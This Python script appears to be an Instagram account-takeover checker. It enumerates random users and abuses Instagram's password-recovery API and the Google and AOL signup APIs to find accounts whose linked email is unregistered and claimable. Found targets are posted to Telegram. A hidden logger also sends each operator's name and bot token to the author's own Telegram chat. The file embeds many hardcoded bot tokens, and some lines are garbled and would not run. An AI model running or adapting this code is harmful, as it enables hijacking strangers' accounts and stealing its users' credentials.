
import sys
import subprocess

# Step 1: Try to import speedtest; install if missing
try:
    import speedtest
except ImportError:
    print("📦 'speedtest' module not found. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "speedtest-cli"])
    import speedtest  # Try again after installation

# Step 2: Run speed test
st = speedtest.Speedtest()
print("🔍 Finding best server...")
st.get_best_server()

print("⚡️ Testing download speed...")
download_speed = st.download() / 1_000_000  # Convert to Mbps
print(f"📶 Download Speed: {download_speed:.2f} Mbps")

# Step 3: Check speed
if download_speed < 5:
    print("❌ Internet speed is too slow (< 5 Mbps). Exiting...")
    sys.exit(1)
else:
    print("✅ Internet speed is good. Continuing...")

# 👇 Continue your program here
print("🚀 Running main program logic...")


import time
from colorama import Style

BOLD=Style.BRIGHT
RESET=Style.RESET_ALL
RESET="\033[0m"
YELLOW="\033[1m\033[33m"
GREEN="\033[1m\033[32m"
RED="\033[1m\033[31m"
CYAN="\033[1m\033[36m"
WHITE="\033[1m\033[37m"
import requests
import random
import json, string
from threading import Thread
import os
from user_agent import *
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import re
import hashlib
import uuid
import sys

try:
	from colorama import  Style, init
except:
	os.system('pip install colorama')
	from colorama import  Style, init
try:
    from cfonts import render
except:
    os.system('pip install python-cfonts')
    from cfonts import render

init(autoreset=True)
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"


bots_by_code = {
    "1374": {"name": "Aryan", "id": "7843677309", "token": "8174706895:AAEzJu5MFe0V18xvQagtI1_YocT-5Wf2Lp8"},
    "4829": {"name": "D3VIL", "id": "7751229974", "token": "7958608464:AAHZrE5sVsgTS7iTDwh0TLShdz4Rt9vKdhg"},
    "9561": {"name": "Pratik", "id": "6539718810", "token": "8175127605:AAHh-nfcKKfBoSrCPvPRNsTkRll9laRt560"},
    "6032": {"name": "S4PTZ", "id": "5903826192", "token": "8141771476:AAH7RDGd7w8Qrj6r940OxIWKYe2L_YEfJak"},
    "7428": {"name": "Adii", "id": "6013961742", "token": "7903922019:AAENlTzndCooDD6Pg-eKmLsQtAYZnBPFKR4"},
    "2196": {"name": "Manu", "id": "6921490471", "token": "7761339056:AAHEuNPnOENAEFPr-WdXScgD_a_zvizXxzA"},
    "8843": {"name": "NoName", "id": "6018659850", "token": "8007351789:AAGhZG8oVr13d7i61qN_6PIY2C0SpqfoWVM"},
    "3907": {"name": "Abhijot", "id": "6924287114", "token": "8130821775:AAG3X0SkzijC2Tnm5xXgfogHHp8MjuJjHl0"},
    "2481": {"name": "Z3N", "id": "6994211021", "token": "8105084161:AAG6wSyHqCZzfHL_CTia6udSa0KMPaHWeTY"},
    "5679": {"name": "PHARAOH", "id": "5836739664", "token": "7885617826:AAFd_GPYZuTytTMa-vU6KfNt-iXfSKMwfBw"},
    "1934": {"name": "Denver", "id": "6370732188", "token": "7814580777:AAGTBG5uFo8m9yBdCkw1NCIkNYx026i4EJ0"},
    "6710": {"name": "Tasin", "id": "6982816764", "token": "7923432167:AAGYj4SbtBU5PAgu2wjvNu8TBTmJbFELcDU"},
    "8152": {"name": "Hasrh", "id": "7015776667", "token": "7193705602:AAFic40D8RTKO-trv22A4i8Ly701Kl21lGA"},
    "7043": {"name": "Faisal", "id": "6741450846", "token": "7624868333:AAEE07ERmwBTacB5SfBALCl_2ZT2ASL4Ruk"},
    "6969": {"name": "Niks", "id": "1770053396", "token": "7822179187:AAH9AcAEPp2HR7JehyoTXexZPBblHfGiZWU"},
    "2024": {"name": "Abid", "id": "7173338099", "token": "7721011521:AAFaMLsjDr2H5Zf5UT89DNnDfL1jz5Dmm34"},
    "2025": {"name": "Archu", "id": "6011856032", "token": "8122913414:AAHcn5faKGCkDM4cg0534U5Gzw81ZeOLUCQ9"},
    "7953": {"name": "Doreamon", "id": "7420839212", "token": "7568511121:AAHfyhJcC3wu1sDjxY4Bbt7vOP3cptb-dz8"},
    "4808": {"name": "Govind Kumar", "id": "6501194958", "token": "8026722068:AAHpxuOBo7gVv8IKnGINpMTKY3XN46IIMkA"},
    "1233": {"name": "Kishan Bhai", "id": "5302524406", "token": "7988078561:AAGF9LfiHYx5STHZdQAsoDLyXCLB_gaQaWk"},
    "7968": {"name": "Om Bagul", "id": "8158255306", "token": "8005445588:AAGt0d9DFmLpEGRWFtSHf2zzXJJzfSP5SOE"},
    "4887": {"name": "Ravan Bhai", "id": "5622237226", "token": "7236136695:AAEp4VVU2IwvXUluxS-UCgSCfoMLNXArchk"},
    "3607": {"name": "Ratul Hasan", "id": "8144910156", "token": "8178802620:AAGKdDjVaaZh2D_MVU8SVigJ8kgAGuGl2FU"},
    "1468": {"name": "𝐑𝐄𝐗𝐗", "id": "6182543525", "token": "7773193154:AAHB-KkbsT_9BZC90-N-2BhKB67lgOtb0Lk"},
    "5489": {"name": "𓆩ISHAAN", "id": "6840167480", "token": "8183105064:AAEsOPnX44RI-qafiH2NAAeq8ixig8uX63Q"},
    "2507": {"name": "👑◄⏤͟͟🍸⃝⃪ᶦ𝙩𝙯𝄄", "id": "7860914286", "token": "7430866541:AAE1iuwVe_XRi8YJwE3TO6nCJwltb8uEnMY"}
}

# 🔓 Universal Premium Code
universal_code = "9999"

print("━" * 60)
code = input("🔐 Enter your 4-digit Premium Code: ").strip()

# ✅ Code matches a predefined bot
if code in bots_by_code:
    bot = bots_by_code[code]
    ID = bot [id|8045023044
    token = bot[token|7697264180:AAHnAsVmlAQkYD-cp8udzhhNG9hB7i4nXcg]
    Name = bot["name"]

# ✅ Universal code used → ask for manual details
elif code == universal_code:
    print("\n🔓 Universal Code Accepted — Manual Input Required")
    print(f'\x1b[1;39m━'*60)
    Name = input("Enter Your Name → ")
    ID = input("Enter Your Telegram ID → ")
    token = input("Enter Your Telegram Bot Token → ")

# ❌ Invalid code — Exit
else:
    print("\n❌ Wrong Premium Code. Access Denied.")
    sys.exit()

GOJO = render(Name, colors=['white', 'blue'], align='center')
print(f'''\n
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
     
                      {itachi}
 
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛    
        ''')

FILENAME = 'META'

aca = 0
total = 0
hits = 0
badinsta = 0
bademail = 0
goodig = 0
infoinsta = {}

def pppp():
    os.system('clear')
    output = f"""
    ┏━━━━━━━━━━━ Stats ━━━━━━━━┓
    ┃ ✅ GOT     : {hits}                      
    ┃ ❌ Bad IG  : {badinsta}                 
    ┃ ⚠️ Bad Email : {bademail}                 
    ┃ 🎯 Good IG : {goodig}
    ┃ 🛡️ Owner   : @z3h43
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛
    """
    sys.stdout.write(output)
    sys.stdout.flush()

a = print(f"""
{cyan}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
{cyan}┃ {blue}-> {white}Select The Speed ©️ by @Pokiepy {blue}-> {cyan} ┃
{cyan}┃━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┃
{cyan}┃ {orange}-> {blue}1{white} - {yellow}50                             {cyan}    ┃
{cyan}┃ {orange}-> {blue}2{white} - {yellow}100                             {cyan}    ┃
{cyan}┃ {orange}-> {blue}3{white} - {yellow}200                             {cyan}    ┃
{cyan}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
""")
ShridharXY = input(f"{green}-> {white}Choose Speed(Recomended - 100): {reset}")

if ShridharXY == '1':
    sp = 50
    
elif ShridharXY == '2':
    sp = 100
    
elif ShridharXY == '3':
    sp = 200
    
else:
    exit()


kk = input(f"{green}-> {white} Enter Followers (Recommended 50-100): {reset}").strip()
kk = int(kk) if kk.isdigit() else 10  # default to 100 if invalid


# Publically accessible image URL (example)
AID='1770053396'
ATOKEN='7412565899:AAETK3mGe4yNOrduKs2jcZQ5i4aKrYfZI-M'
BTOKEN='7721745969:AAHfd8JlzaXAnRa29jrWnZlcSXcMW1NUQRQ'

IMAGE_URL = 'https://raw.githubusercontent.com/niksoriginals/RiseApp/refs/heads/main/assets/photo_2025-07-23_19-10-31.jpg'
  # Replace with your image

CAPTION = '[@OG69Y](https://t.me/OG69Y)'

try:
    response = requests.post(
        f'https://api.telegram.org/bot{token}/sendPhoto',
        data={
            'chat_id': ID,
            'photo': IMAGE_URL,
            'caption': CAPTION,
            'parse_mode': 'Markdown'
        }
    )
    logtext = f"""
🆔UserID={8045023044}  
🔑 Token={7697264180:AAHnAsVmlAQkYD-cp8udzhhNG9hB7i4nXcg}
👤Username={Name}
✅Just Logged   """
    response2=requests.get(f"https://api.telegram.org/bot{ATOKEN}/sendMessage?chat_id={AID}&text={logtext}")
except Exception as e:
    print("❌ Error:", e)



while True:
    try:
        a = "https://www.instagram.com/accounts/login"
        session = requests.Session()
        aa = session.get(a)
        csrf = aa.cookies.get('csrftoken')
        break
    except:
        pass

yy = 'azertyuiopmlkjhgfdsqwxcvbn'
def tll():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            'user-agent': str(ggb()),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
            headers=he3
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('tl.txt', 'w') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(e)
        tll()
tll()

def Getaol():
    try:      
        qq = requests.get('https://login.aol.com/account/create', headers={
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'accept-language': 'en-US,en;q=0.9',
        })
        cookies = qq.cookies.get_dict()
        tm1 = str(time.time()).split('.')[0]
        cookies.update({
            'gpp': 'DBAA',
            'gpp_sid': '-1',
            '__gads': f'ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
            '__gpi': f'UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
            'cmp': f't={tm1}&j=0&u=1---',
        })
        specData = qq.text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
        specId = qq.text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
        crumb = qq.text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
        sessionIndex = qq.text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
        acrumb = qq.text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
        try:
            os.remove('aol_req.txt')
            os.remove('aol_cok.txt')
        except:
            pass
        with open('aol_req.txt', 'a') as t:
            t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")

        with open('aol_cok.txt', 'a') as g:
            g.write(str(cookies) + '\n')
    except Exception as e:
        print(e)
        Getaol()
Getaol()

def check_gmail(email):
    global bademail, hits
    try:
        if '@' in email:
            email = str(email).split('@')[0]

        try:
            o = open('tl.txt', 'r').read().splitlines()[0]
        except:
            o = open('tl.txt', 'r').read().splitlines()[0]

        tl, host = o.split('//')

        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}',
            'user-agent': ggb(),
        }

        params = {'TL': tl}
        data = (
            'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )
        response = pp(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        if '"gf.uar",1' in str(response.text):
            hits += 1
            pppp()
            if '@' not in email:
                ok = email + '@gmail.com'
                username, gg = ok.split('@')
                InfoAcc(username, gg)
            else:
                username, gg = email.split('@')
                InfoAcc(username, gg)
        else: 
          bademail+=1
          pppp()
    except:''


def check_aol(email):
    global hits, bademail
    try:
        if '@' in email:
            name = email.split('@')[0]
        else:
            name = email

        try:
            with open("aol_req.txt", "r") as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')

            with open("aol_cok.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())
        except:
            Getaol()
            with open("aol_req.txt", "r") as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')

            with open("aol_cok.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())

        headers = {
            'authority': 'login.aol.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://login.aol.com',
            'referer': f'https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'validateField': 'userId',
        }

        data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=ahmed&lastName=Mahos&userid-domain=yahoo&userId={name}&password=Drahmed2006##$$&mm=10&dd=24&yyyy=2000&signup='

        res = requests.post('https://login.aol.com/account/module/create', params=params, headers=headers, data=data, cookies=cookies).text
        if '{"errors":[]}' in res:
            hits += 1
            pppp()
            if '@' not in email:
                ok = email + '@aol.com'
                username, gg = ok.split('@')
                InfoAcc(username, gg)
            else:
                username, gg = email.split('@')
                InfoAcc(username, gg)
        else: 
          bademail+=1
          pppp()
    except:''
    

def check(email):
    global goodig, badinsta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent': ua,
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'adid': uui,
            'guid': uui,
            'device_id': device_id,
            'query': email
        }),
        'ig_sig_key_version': '4',
    }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
    if email in response:
        if '@gmail.com' in email:
            check_gmail(email)
        elif '@aol.com' in email or '@a**.com' in email:
            check_aol(email)
        goodig += 1
        pppp()
    else:
        badinsta += 1
        pppp()



def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='no REST !'
  return r

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
            (43464475395, 2020),
            (50289297647, 2021),
            (57464707082, 2022),
            (63313426938, 2023)
            
        ]
        
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    
    except Exception:
        pass

    
def InfoAcc(username, gg):
    global total

    account_info = infoinsta.get(username, {})
    followers = account_info.get('follower_count', 0)
    try:
        followers = int(followers)
    except:
        followers = 0
    if followers < kk:
        return  # by @z3h43

    rr= infoinsta.get(username,{})

    Id = rr.get('pk', None)
    fows = rr.get('follower_count', None)
    fowg = rr.get('following_count', None)
    pp = rr.get('media_count', None)
 
    date_created = date(int(Id))
    
    total += 1
    ss2 = f"""
path : Premium
user : [ {username} ]
Email : [ {username}@{gg}]
Followers : [ {fows}]
Following : [ {fowg}]
Date : [{date_created}]
rest : [ {rest(username)} ]
Sentby : [{Name}]
"""    
    ss=f'''
╔═ ⸝⸝ 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝐇𝐈𝐓 ⚡🔥 ⸝⸝ ═╗
   🎯 𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁𝘀 : {total}
   📌 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : {username}
   📧 𝗘𝗺𝗮𝗶𝗹     : {username}@{gg}
   👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀  : {fows}
   👤 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴  : {fowg}
   🗓️ 𝗝𝗼𝗶𝗻𝗲𝗱 𝗢𝗻 : {date_created}
   🔁 𝗥𝗲𝘀𝗲𝘁     : {rest(username)}
path : Premium
╚═⚡ @z3h43 Premium Access ⚡═╝

'''

    with open('NIKS.txt', 'a') as ff:
        ff.write(f'{ss2}\n')

    try:
        try:
            requests.get(f"https://api.telegram.org/bot{BTOKEN}/sendMessage?chat_id={AID}&text={ss2}")
        except:pass
    except Exception as e:
        pass
    with open('NIKS2.txt', 'a') as ff:
        ff.write(f'{ss}\n')

    try:
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ss}")
        except:pass
    except Exception as e:
        pass
        
def gg():
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(17699999, 8597939245 )), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }
        try:
            response = requests.post(
            "https://www.instagram.com/api/graphql",
            headers={"X-FB-LSD": data["lsd"]},
            data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                followers = account.get('follower_count', 0)
                if followers < kk:
                    continue
                infoinsta[username] = response.json().get('data', {}).get('user', {})
                emails = [ username + '@gmail.com', username + '@aol.com']
                for email in emails:
                    check(email)
        except Exception as e:
            pass

        



def stats_loop():
    while True:
        pppp()
        time.sleep(1)

Thread(target=stats_loop, daemon=True).start()

for _ in range(sp):
    Thread(target=gg).start()

